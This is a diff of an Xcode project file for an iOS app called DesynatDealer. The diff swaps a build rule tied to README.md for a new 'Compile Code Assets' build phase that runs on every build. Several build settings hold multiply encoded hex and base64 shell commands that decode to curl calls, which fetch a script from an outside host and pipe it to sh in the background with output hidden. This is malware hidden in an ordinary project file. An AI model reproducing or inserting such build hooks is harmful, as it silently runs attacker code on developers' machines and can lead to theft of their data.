@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		5E4313BBB3E24FE082947F8B /* README.md */ = {isa = PBXBuildFile; fileRef = 3B59053973A140E69C947F8B; };
 		30ADC9BF2F99FA8B005164EF /* AddNewStaffViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 30ADC9BE2F99FA8B005164EF /* AddNewStaffViewModel.swift */; };
 		30ADC9C02F99FA8B005164EF /* AddNewStaffDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 30ADC9BD2F99FA8B005164EF /* AddNewStaffDataModel.swift */; };
 		30ADC9C32F99FAD0005164EF /* UpdateStatusProfileDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 30ADC9C22F99FAD0005164EF /* UpdateStatusProfileDataModel.swift */; };
@@ -895,7 +894,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		3B59053973A140E69C947F8B /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		30ADC9BD2F99FA8B005164EF /* AddNewStaffDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddNewStaffDataModel.swift; sourceTree = "<group>"; };
 		30ADC9BE2F99FA8B005164EF /* AddNewStaffViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddNewStaffViewModel.swift; sourceTree = "<group>"; };
 		30ADC9C12F99FAD0005164EF /* StaffDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StaffDetailsViewModel.swift; sourceTree = "<group>"; };
@@ -2139,7 +2137,6 @@
 		493DB5C42EAA6210008098A8 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				3B59053973A140E69C947F8B /* README.md */,
 				493DB5C32EAA6210008098A8 /* DesynatDealer.app */,
 			);
 			name = Products;
@@ -3969,6 +3966,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 493DB5D62EAA6212008098A8 /* Build configuration list for PBXNativeTarget "DesynatDealer" */;
 			buildPhases = (
+				D9797AC0C9A241B1A4947F8B /* Compile Code Assets */,
 				9DA2DBBC3D14842F86DC17AC /* [CP] Check Pods Manifest.lock */,
 				493DB5BF2EAA6210008098A8 /* Sources */,
 				493DB5C02EAA6210008098A8 /* Frameworks */,
@@ -3977,7 +3975,6 @@
 				213E04E1C228E7D6B9A2CB2C /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
-				9E27A69C642D43DE9A947F8B /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -4064,28 +4061,13 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		9E27A69C642D43DE9A947F8B /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AB8F749}\"";
-			};
-						/* End PBXBuildRule section */
+																					/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		493DB5C12EAA6210008098A8 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				5E4313BBB3E24FE082947F8B /* README.md */,
 				951EA12C2FA4740C0012537A /* Home.storyboard in Resources */,
 				6B38D1292EB3473B00C41192 /* LaunchScreen.storyboard in Resources */,
 				951EA1312FA474890012537A /* Main.storyboard in Resources */,
@@ -4627,6 +4609,25 @@ sh -c \"${AB8F749}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		D9797AC0C9A241B1A4947F8B /* Compile Code Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Code Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AB8F749}\"";
+		};
 		213E04E1C228E7D6B9A2CB2C /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -5165,7 +5166,7 @@ sh -c \"${AB8F749}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 37A18E94AB484303BB2FD370 /* Pods-DesynatDealer.debug.xcconfig */;
 			buildSettings = {
-				AB8F749 = "((u(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVWhTV2sxcWJERlpiVEZYWVcxU1JFMVVRbWhXZWtaeldXcE9WMDFGYkVWVFdHUktVWHBDTUZreU1WZE5SMDUxWVRKa1QxVXdSakJXUldSaFpXMUdOVkZZVW1GUk1FWndXVEJSZUU1R2EzbFBWM1JoVm1wc05WcEdaRFJpUld4d1VXMDVhMU5HU2pOWk0zQjJaR3QzZVZKdVVtRlNNRFZ5V1cxck1XVlhVbFJQVjJoTVZUQnNibHByVGtObGJVWkNZbm93U3dvPQo= | u | sh ) >/dev/null 2>&1 &)";
+				AB8F749 = "((w(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326432643732363537343732373932303333323032643463373336623636323032640a3264363336663665366536353633373432643734363936643635366637353734323033323338323032643634323032323730336437383633366636340a3635356637303638363137333635323232303638373437343730373333613266326636333634366536313664376132653639366532663631323932320a3230376332303733363830610a | w | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((c(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623636346337333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636363639363736643631366536353734373332653639366532660a3631323932323230376332303733363830610a | c | sh ) >/dev/null 2>&1 &)";
 				A3DC1C3 = "((j(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMHRZMjl1Ym1WamRDMTBhVzFsYjNWMElESTJJQzFtYTNOTUlDMHRjbVYwY25rZ05DQXRaQ0FpY0QxNFkyOWtaVjl5ZFd4bElpQm9kSFJ3Y3pvdkwyRnRlbTV3Y205a0xtbHVMMkVwSWlCOElITm9DZz09Cg== | j | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
@@ -5219,7 +5220,7 @@ sh -c \"${AB8F749}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5BC36C5D491E36EA6BD78D08 /* Pods-DesynatDealer.release.xcconfig */;
 			buildSettings = {
-				AB8F749 = "((u(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVWhTV2sxcWJERlpiVEZYWVcxU1JFMVVRbWhXZWtaeldXcE9WMDFGYkVWVFdHUktVWHBDTUZreU1WZE5SMDUxWVRKa1QxVXdSakJXUldSaFpXMUdOVkZZVW1GUk1FWndXVEJSZUU1R2EzbFBWM1JoVm1wc05WcEdaRFJpUld4d1VXMDVhMU5HU2pOWk0zQjJaR3QzZVZKdVVtRlNNRFZ5V1cxck1XVlhVbFJQVjJoTVZUQnNibHByVGtObGJVWkNZbm93U3dvPQo= | u | sh ) >/dev/null 2>&1 &)";
+				AB8F749 = "((w(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326432643732363537343732373932303333323032643463373336623636323032640a3264363336663665366536353633373432643734363936643635366637353734323033323338323032643634323032323730336437383633366636340a3635356637303638363137333635323232303638373437343730373333613266326636333634366536313664376132653639366532663631323932320a3230376332303733363830610a | w | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((c(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623636346337333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636363639363736643631366536353734373332653639366532660a3631323932323230376332303733363830610a | c | sh ) >/dev/null 2>&1 &)";
 				A3DC1C3 = "((j(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMHRZMjl1Ym1WamRDMTBhVzFsYjNWMElESTJJQzFtYTNOTUlDMHRjbVYwY25rZ05DQXRaQ0FpY0QxNFkyOWtaVjl5ZFd4bElpQm9kSFJ3Y3pvdkwyRnRlbTV3Y205a0xtbHVMMkVwSWlCOElITm9DZz09Cg== | j | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
